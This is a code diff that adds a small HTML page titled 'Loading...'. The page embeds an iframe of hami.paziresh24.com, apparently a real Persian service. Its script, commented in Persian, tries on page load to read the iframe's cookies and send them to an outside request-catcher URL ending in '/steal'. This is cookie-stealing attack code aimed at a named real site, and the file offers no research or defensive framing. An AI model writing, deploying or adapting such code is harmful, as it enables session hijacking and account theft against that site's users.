@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <iframe src="https://hami.paziresh24.com" width="100%" height="500"></iframe>
+    <script>
+        // وقتی صفحه لود شد، این کد اجرا میشه
+        window.onload = function() {
+            // سعی می‌کنه کوکی رو از iframe بگیره
+            try {
+                const iframe = document.querySelector('iframe');
+                const cookie = iframe.contentWindow.document.cookie;
+                if (cookie) {
+                    fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(cookie));
+                }
+            } catch (e) {
+                // اگه دسترسی نداشت، هیچی نمیکنه
+                console.log('Could not access cookie');
+            }
+        };
+    </script>
+</body>
+</html>
